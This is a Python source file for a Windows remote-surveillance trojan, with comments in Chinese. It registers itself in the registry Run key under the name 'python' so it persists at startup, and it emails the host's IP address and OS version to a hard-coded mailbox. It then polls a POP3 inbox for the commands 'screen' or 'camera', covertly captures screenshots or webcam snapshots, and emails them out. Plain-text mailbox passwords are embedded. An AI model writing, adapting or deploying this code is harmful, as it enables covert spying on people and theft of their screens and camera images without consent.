# -*- coding:utf-8 -*-
import win32api
import win32con
import platform
import socket
import time
import os
import smtplib
import poplib
from VideoCapture import Device
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import poplib,email
from email.header import decode_header
from PIL import ImageGrab
'''
import qiniu.conf
import qiniu.io
import qiniu.rs
#去七牛申请
qiniu.conf.ACCESS_KEY = ""
qiniu.conf.SECRET_KEY = ""
'''
#获取ip
def getIP():
    ip=socket.gethostbyname(socket.gethostname())
    return ip

#获取操作系统版本、
def getSystemVersion():
    return platform.platform()

def send_Information(ip,system_version):
    info='ip:'+ip+'  '+'system version:'+system_version
    print info
    smtp=smtplib.SMTP()
    smtp.connect('smtp.163.com')
    smtp.login('18202723109@163.com','zhang4818774') #改成自己的邮箱和密码
    smtp.sendmail('18202723109@163.com','584392383@qq.com',info)#把接收邮箱改成自己另外一个邮箱
#截图，图片名为截图时间
def screen_capture():
    #获取截图时间
    pic_time=time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
    #pic_name='screen_capture'+time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
    pic_name='screen'+pic_time+'.jpg'
    pic = ImageGrab.grab()
    pic.save('%s' % pic_name)
    print pic_name
    #发送图片
    send_Img(pic_time,pic_name)
    print pic_name
    os.remove(pic_name)#删除图片

#发送截图图片到邮箱
def send_Img(pic_time,pic_name):
    msgRoot = MIMEMultipart('related')
    msgRoot['Subject'] = pic_time
    msgRoot['from'] = '18202723109@163.com'
    msgRoot['to'] = "584392383@qq.com"

    msgText = MIMEText('<b>capture</b> <br><img src="cid:image1">','html','utf-8')
    msgRoot.attach(msgText)

    #fp = open('F:\\1.jpg', 'rb')
    fp = open(pic_name, 'rb')
    msgImage = MIMEImage(fp.read())
    fp.close()

    msgImage.add_header('Content-ID', '<image1>')
    msgRoot.attach(msgImage)

    smtp = smtplib.SMTP()
    smtp.connect('smtp.163.com','25')
    smtp.login('18202723109@163.com','zhang4818774')
    smtp.sendmail('18202723109@163.com','584392383@qq.com', msgRoot.as_string())
    smtp.quit()
    print 'send success'

#摄像头截图，每隔SLEEP_TIME秒截取一张
def camera_capture():
    #抓取频率
    SLEEP_TIME=3
    i=0
    cam=Device(devnum=0, showVideoWindow=0)
    while i<10:

        cam_time=time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
        cam_name='camera'+cam_time+'.jpg'

        cam.saveSnapshot(cam_name,3,1,'bl')
        camera_upload(cam_name)
        print str(i)+cam_name
        os.remove(cam_name)
        time.sleep(SLEEP_TIME)
        i+=1
'''
 #上传到七牛
def camera_upload(file):
    policy = qiniu.rs.PutPolicy('iloster') #空间名，iloster是我的空间名
    uptoken = policy.token()

    ret, err = qiniu.io.put_file(uptoken, None, file)
    if err is not None:
        sys.stderr.write('error: %s ' % err)
'''
#获取最新邮件
def accept_mail():
    pop=poplib.POP3_SSL('pop.qq.com')
    pop.user('584392383@qq.com')
    pop.pass_('zhang@shan941008')
    #获取邮件数目
    (num,totalSize)=pop.stat()
    #获取最新的邮件
    (heard,msg,octets)=pop.retr(num)
    mail=email.message_from_string("\n".join(msg))
    subject=email.Header.decode_header(mail['subject'])[0][0] #标题
    pop.quit()
    return subject

#获得程序的路径
def getPath():
    path=os.getcwd()+'\Remote.exe'  #最后打包的exe程序名必须为Remote.exe,或者把这里改一下
    print path
    return path
#添加开机自启动,在注册表里注册
def add_start(path):
    subkey='SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    key=win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,subkey,0,win32con.KEY_ALL_ACCESS)
#    print win32api.RegQueryValueEx(key,'python')

    win32api.RegSetValueEx(key,'python',0,win32con.REG_SZ,path)
    print win32api.RegQueryValueEx(key,'python')
if __name__=='__main__':
    add_start(getPath()) #添加开机自启动
    send_Information(getIP(),getSystemVersion())
    while 1: #不断的监听
        if accept_mail()=='screen': #当获取的邮件主题为screen时，截取屏幕信息
            screen_capture()
        elif accept_mail()=='camera':
            camera_capture()
